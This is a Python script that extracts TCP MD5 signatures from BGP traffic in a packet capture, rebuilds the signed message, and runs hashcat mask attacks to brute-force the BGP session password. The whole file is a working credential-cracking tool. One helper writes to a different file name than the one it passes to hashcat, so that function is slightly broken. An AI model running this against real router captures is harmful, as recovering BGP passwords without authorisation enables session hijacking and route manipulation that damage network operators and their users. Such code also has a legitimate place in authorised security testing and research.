import sys, os
import scapy.all as scapy
from scapy.layers.inet import IP, TCP
from scapy.contrib.bgp import *
from scapy.compat import raw
import hashlib


def IP_to_hexstring(s):
    h = ""
    #remove dots
    l = s.split(".")
    for i in l:
        h += "{:02x}".format(int(i))
    return h 


def get_hashed_message(p):
    """
    Returns a hex string with the contents hashed in the TCP md5 option (except the password):
        md5(get_hashed_message(p) + password) = tcp md5 checksum
    """
    message = ""
    # TCP pseudo header
    message += IP_to_hexstring(p[IP].src)
    message += IP_to_hexstring(p[IP].dst)
    message += "{:02x}".format(p[IP].proto)
    message += "{:04x}".format(p[IP].len)
    #TCP header, excluding options and with checksum = 0
    header = raw(p[TCP])
    s = header[:16] + b"\x00\x00" + header[18:20]
    s = s.hex()
    message += s
    #TCP segment data (payload)
    s = raw(p[TCP].payload).hex()
    #if no payload, s = ""
    message += s
    return message

def parse_packets(packets):
    hash_pairs = []
    for p in packets:
        if TCP in p:
            if p[TCP].sport == 179 or p[TCP].dport == 179:
                #if it is a BGP packet
                options_types = [o[0] for o in p[TCP].options]
                if 19 in options_types:
                    md5_hash = (p[TCP].options[options_types.index(19)][1]).hex()
                    message = get_hashed_message(p)
                    hash_pairs.append((md5_hash, message))
    return hash_pairs

def test_hashcat(password, message):
    """Test hashcat breaking with a chosen password"""
    file_hash = "hast_test.txt"
    s = bytes.fromhex(message) + bytes(password, encoding='utf-8')
    h = hashlib.md5(s).hexdigest()
    with open("hash_test", "w") as f:
        f.write(h + ':' + message)
    os.system("hashcat -m 20 -a 3 --hex-salt {} ?u?l?l?l?l".format(file_hash))
    os.remove(file_hash)


def hashcat_crack(md5_hash, message, mask, increment=False, increment_b=(1,9)):
    file_hash = "hast_test.txt"
    s = bytes.fromhex(message)
    with open(file_hash, "w") as f:
        f.write(md5_hash + ':' + message)
    c = "hashcat -m 20 -a 3 --hex-salt {} {}".format(file_hash, mask)
    if increment:
        c += " --increment --increment-min {} --increment-max {}".format(increment_b[0], increment_b[1])
    os.system(c)
    os.system(c + " --show")
    os.remove(file_hash)


# def hashcat_command(md5_hash, message, bytes_mask=6):
#     #Add --increment for increment of length
#     c = "hashcat -m 0 -a 3 --hex-charset "  +  md5_hash +  " " + message + "?h" * bytes_mask
#     return c


if __name__ == "__main__":
    if len(sys.argv) > 1:
        input_file = sys.argv[1]
    else:
        input_file = "BGP_MD5.cap"
        # input_file = input("Input file (pcap): ")
    
    packets = scapy.rdpcap(input_file)
    hash_pairs = parse_packets(packets)
    for p in hash_pairs[2:3]:
        h,m = p[0], p[1]
        print(h,m)
    #try to break the BGP password
    mask = "-1 ?u?l -2 ?u?l?d ?2?2?2?2?2?2?2?2?2?2"
    hashcat_crack(h,m,mask, increment=True, increment_b=(7,10))